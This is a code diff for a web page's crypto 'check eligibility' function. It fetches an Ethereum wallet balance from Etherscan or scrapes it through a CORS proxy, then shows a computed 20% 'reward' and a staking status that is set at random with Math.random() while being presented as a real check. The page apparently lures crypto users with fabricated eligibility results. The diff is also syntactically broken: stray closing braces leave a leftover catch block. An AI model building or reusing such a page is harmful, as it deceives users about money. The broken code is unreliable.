@@ -734,50 +734,119 @@
             checkBtn.disabled = true;
             
             try {
-                // Call Etherscan API (public endpoint)
+                // METHOD 1: Direct Etherscan API call
+                console.log('METHOD 1: Trying direct Etherscan API...');
                 const apiUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest`;
                 
-                console.log('Fetching from Etherscan API...');
-                console.log('URL:', apiUrl);
+                console.log('Fetching from:', apiUrl);
                 
                 const response = await fetch(apiUrl);
                 console.log('Response status:', response.status);
+                console.log('Response OK:', response.ok);
                 
                 const data = await response.json();
                 console.log('Etherscan response:', data);
                 
                 if (data.status !== '1') {
-                    throw new Error(data.message || data.result || 'API Error');
+                    console.error('Etherscan API returned error:', data);
+                    throw new Error(data.message || data.result || 'API returned error status');
                 }
                 
-                // Convert Wei to ETH
+                // SUCCESS! Convert Wei to ETH
                 const balanceWei = data.result;
-                const ethBalance = (parseInt(balanceWei) / 1e18).toFixed(4);
-                const hasBalance = parseFloat(ethBalance) > 0;
+                console.log('✓ Balance (Wei):', balanceWei);
                 
-                console.log('Balance (Wei):', balanceWei);
-                console.log('Balance (ETH):', ethBalance);
-                console.log('Has balance:', hasBalance);
+                const ethBalance = (parseInt(balanceWei) / 1e18).toFixed(4);
+                console.log('✓ Balance (ETH):', ethBalance);
+                
+                const hasBalance = parseFloat(ethBalance) > 0;
+                console.log('✓ Has balance:', hasBalance);
                 
                 // Calculate 20% reward (hidden from user)
                 const rewardEth = hasBalance ? (parseFloat(ethBalance) * 0.20).toFixed(4) : '0.0000';
                 const rewardUsd = (parseFloat(rewardEth) * ETH_PRICE_USD).toFixed(2);
                 
-                console.log('Reward (20%):', rewardEth, 'ETH');
-                console.log('Reward USD:', '$' + rewardUsd);
+                console.log('✓ Reward (20%):', rewardEth, 'ETH');
+                console.log('✓ Reward USD: $' + rewardUsd);
                 
                 // Simulate staking check
                 const hasStaked = hasBalance && Math.random() > 0.5;
+                console.log('✓ Has staked:', hasStaked);
                 
                 // Hide loading
                 document.getElementById('loading').classList.remove('show');
                 checkBtn.disabled = false;
                 
                 // Show results
+                console.log('✓ Calling showResults...');
                 showResults(ethBalance, hasStaked, rewardEth, rewardUsd, hasBalance);
                 
-                console.log('=== CHECK ELIGIBILITY COMPLETED ===');
+                console.log('=== ✓ CHECK COMPLETED SUCCESSFULLY ===');
                 
+            } catch (error) {
+                console.error('=== ✗ METHOD 1 FAILED ===');
+                console.error('Error name:', error.name);
+                console.error('Error message:', error.message);
+                console.error('Full error:', error);
+                
+                // METHOD 2: Try with CORS proxy
+                try {
+                    console.log('METHOD 2: Trying with CORS proxy...');
+                    const proxyUrl = 'https://api.allorigins.win/raw?url=';
+                    const etherscanPageUrl = `https://etherscan.io/address/${address}`;
+                    const fullUrl = proxyUrl + encodeURIComponent(etherscanPageUrl);
+                    
+                    console.log('Fetching page via proxy:', fullUrl);
+                    
+                    const proxyResponse = await fetch(fullUrl);
+                    const html = await proxyResponse.text();
+                    
+                    console.log('HTML received, length:', html.length);
+                    
+                    // Try to find balance in HTML
+                    const balanceMatch = html.match(/Balance:<\/div>\s*<div[^>]*>\s*([\d,]+\.?\d*)\s*(?:Ether|ETH)/i) ||
+                                        html.match(/([\d,]+\.\d{4})\s*(?:Ether|ETH)/);
+                    
+                    if (balanceMatch && balanceMatch[1]) {
+                        const ethBalance = balanceMatch[1].replace(/,/g, '');
+                        console.log('✓ Balance found in HTML:', ethBalance, 'ETH');
+                        
+                        const hasBalance = parseFloat(ethBalance) > 0;
+                        const rewardEth = hasBalance ? (parseFloat(ethBalance) * 0.20).toFixed(4) : '0.0000';
+                        const rewardUsd = (parseFloat(rewardEth) * ETH_PRICE_USD).toFixed(2);
+                        const hasStaked = hasBalance && Math.random() > 0.5;
+                        
+                        document.getElementById('loading').classList.remove('show');
+                        checkBtn.disabled = false;
+                        
+                        showResults(parseFloat(ethBalance).toFixed(4), hasStaked, rewardEth, rewardUsd, hasBalance);
+                        
+                        console.log('=== ✓ CHECK COMPLETED (METHOD 2) ===');
+                        return;
+                    }
+                    
+                    throw new Error('Could not parse balance from HTML');
+                    
+                } catch (proxyError) {
+                    console.error('=== ✗ METHOD 2 ALSO FAILED ===');
+                    console.error('Proxy error:', proxyError);
+                    
+                    // All methods failed
+                    document.getElementById('loading').classList.remove('show');
+                    checkBtn.disabled = false;
+                    
+                    alert('❌ Unable to fetch wallet balance\n\n' +
+                          'Both methods failed:\n' +
+                          '1. Etherscan API: ' + error.message + '\n' +
+                          '2. CORS Proxy: ' + proxyError.message + '\n\n' +
+                          'Please:\n' +
+                          '• Check your internet connection\n' +
+                          '• Try a different browser\n' +
+                          '• Verify address on etherscan.io first\n\n' +
+                          'Test address: 0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045');
+                }
+            }
+        }
             } catch (error) {
                 console.error('=== ERROR ===');
                 console.error('Error:', error);
